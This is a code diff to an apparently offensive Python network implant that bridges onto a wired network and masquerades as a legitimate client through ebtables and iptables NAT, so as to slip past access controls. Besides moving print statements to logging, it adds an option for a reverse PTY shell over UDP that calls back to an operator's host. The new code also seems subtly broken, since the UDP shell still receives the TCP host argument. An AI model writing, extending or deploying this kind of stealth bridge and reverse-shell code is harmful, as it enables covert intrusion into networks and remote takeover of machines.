@@ -13,6 +13,7 @@ import re
 from threading import Thread
 import socket
 import pty
+import logging
 
 import pcapy
 from pcapy import open_live
@@ -22,6 +23,8 @@ import impacket.dhcp
 import impacket.ImpactPacket
 from impacket.ImpactDecoder import EthDecoder, LinuxSLLDecoder
 
+
+logging.basicConfig(stream=sys.stderr, level=logging.INFO)
 
 def cmd(c):
     return subprocess.check_output(c, shell=True)
@@ -261,7 +264,7 @@ class DecoderThread(Thread):
                 self.subnet.registeraddress(arp.get_ar_spa())
 
             if arp.get_op_name(arp.get_ar_op()) == "REPLY":
-                print "got arp reply"
+                logging.debug("got arp reply")
                 self.arptable.registeraddress(arp.get_ar_spa(), arp.as_hrd(arp.get_ar_sha()))
             if arp.get_op_name(arp.get_ar_op()) == "REQUEST":
                 self.arptable.registeraddress(arp.get_ar_spa(), arp.as_hrd(arp.get_ar_sha()))
@@ -274,7 +277,7 @@ class ArpTable:
         ip = self.printip(ip_array)
         if ip != "0.0.0.0":
             self.table[ip] = hw_address
-            print "%s : %s" % (ip, hw_address)
+            logging.debug("%s : %s" % (ip, hw_address))
 
     def printip(self, ip_array):
         ip_string = socket.inet_ntoa(struct.pack('BBBB', *ip_array))
@@ -309,8 +312,8 @@ class Subnet:
             if self.maxaddress is None or self.maxaddress[3] < ip_array[3]:
                 self.maxaddress = ip_array
         else:
-            print self.printip(ip_array)
-            print "[!] Error, duplicate or big subnet detected"
+            logging.debug(self.printip(ip_array))
+            logging.error("[!] Error, duplicate or big subnet detected")
 
     def checksubnet(self, ip_array):
         if self.subnet is None:
@@ -423,9 +426,9 @@ class Netfilter:
 
     def updatetables(self):
         self.flushtables()
-        print "Updating netfilter"
+        logging.debug("Updating netfilter")
 
-        print "[*] Setting up layer 2 NAT"
+        logging.info("[*] Setting up layer 2 NAT")
         os.system("ip addr add 169.254.66.77/24 dev %s" % self.bridge.bridgename)
         os.system("ebtables -A OUTPUT -p 0x0806 -j DROP")  # _really_ block arp e.g. for nmap
         os.system("ebtables -t nat -A POSTROUTING -s %s -o %s -j snat --snat-arp --to-src %s" %
@@ -434,7 +437,7 @@ class Netfilter:
                   (self.bridge.ifmacs[self.bridge.clientsiteint], self.bridge.clientsiteint, self.subnet.get_gatewaymac()))
         os.system("arp -s -i %s 169.254.66.55 %s" % (self.bridge.bridgename, self.subnet.get_gatewaymac()))
 
-        print "[*] Setting up layer 3 NAT"
+        logging.info("[*] Setting up layer 3 NAT")
         sports = {'tcp': ':61000-62000', 'udp': ':61000-62000', 'icmp': ''}
         for proto in ['tcp', 'udp', 'icmp']:
             os.system("iptables -t nat -A POSTROUTING -o %s -s 169.254.0.0/16 -d %s -p %s -j SNAT --to %s%s" %
@@ -442,7 +445,7 @@ class Netfilter:
             os.system("iptables -t nat -A POSTROUTING -o %s -s 169.254.0.0/16 -p %s -j SNAT --to %s%s" %
                       (self.bridge.bridgename,  proto, self.subnet.clientip, sports[proto]))
 
-        print "[*] NAT is ready. Allow OUTPUT on interfaces"
+        logging.info("[*] NAT is ready. Allow OUTPUT on interfaces")
         os.system("ebtables -A OUTPUT -o %s -j ACCEPT" %
                   self.bridge.clientsiteint)
         os.system("ebtables -A OUTPUT -o %s -j ACCEPT" %
@@ -509,26 +512,26 @@ class Bridge:
         return re.search("..:..:..:..:..:..", res).group(0)
 
     def srcmac2bridgeint(self, srcmac):
-        print "searching for mac: %s ..." % srcmac
+        logging.debug("searching for mac: %s ..." % srcmac)
         portnumber = cmd("brctl showmacs %s | grep %s | awk '{print $1}'" %
                          (self.bridgename, srcmac)).rstrip()
         if not portnumber:
-            print "portnumber not found bailing"
+            logging.debug("portnumber not found bailing")
             return False
-        print "portnumber is: %s" % portnumber
+        logging.debug("portnumber is: %s" % portnumber)
         interface = cmd("brctl showstp %s | grep '(%s)' | head -n1 | awk '{print $1}'" %
                         (self.bridgename, portnumber)).rstrip()
-        print "got interface: %s .." % interface
+        logging.debug("got interface: %s .." % interface)
         if not interface:
-            print "error getting interface, is the bridge setup right?"
+            logging.error("error getting interface, is the bridge setup right?")
             return False
         return interface
 
     def setinterfacesides(self):
         self.switchsideint = self.srcmac2bridgeint(self.subnet.get_gatewaymac())
-        print "switchside interface: %s - %s" % (self.switchsideint, self.ifmacs[self.switchsideint])
+        logging.debug("switchside interface: %s - %s" % (self.switchsideint, self.ifmacs[self.switchsideint]))
         self.clientsiteint = self.srcmac2bridgeint(self.subnet.get_clientmac())
-        print "clientside interface: %s - %s" % (self.clientsiteint, self.ifmacs[self.clientsiteint])
+        logging.debug("clientside interface: %s - %s" % (self.clientsiteint, self.ifmacs[self.clientsiteint]))
 
     def up(self):
         for interface in [self.bridgename] + self.interfaces:
@@ -562,8 +565,10 @@ def main():
     netfilter = Netfilter(subnet, bridge)
     arptable = ArpTable()
     shell = None
-    if args.rev_host:
+    if args.rev_udp_host:
         shell = UDPPtyReverseShell(args.rev_host, args.rev_password, args.rev_sleep)
+    if args.rev_host:
+        shell = ReverseShell(args.rev_host, args.rev_password, args.rev_sleep)
 
     bridge.up()
     decoder = DecoderThread(bridge, subnet, arptable)
@@ -633,6 +638,13 @@ if __name__ == '__main__':
                              "On your remote machine use netcat, ncat, socat "
                              "or something else to listen on the specified "
                              "port.")
+    parser.add_argument('-R', '--rev-udp-host', default=None,
+                        metavar="<HOST>:<PORT>",
+                        help="Enable the reverse PTY UDP shell and set the "
+                             "host and port where it should connect to.\n"
+                             "On your remote machine use `tty`,raw,echo=0 udp-listen:port, reuseaddr"
+                             "or something else to listen on the specified "
+                             "port.")                   
     parser.add_argument('-p', '--rev-password', default=None,
                         help="Specify a password for the reverse shell to "
                              "prevent unauthorized access.")
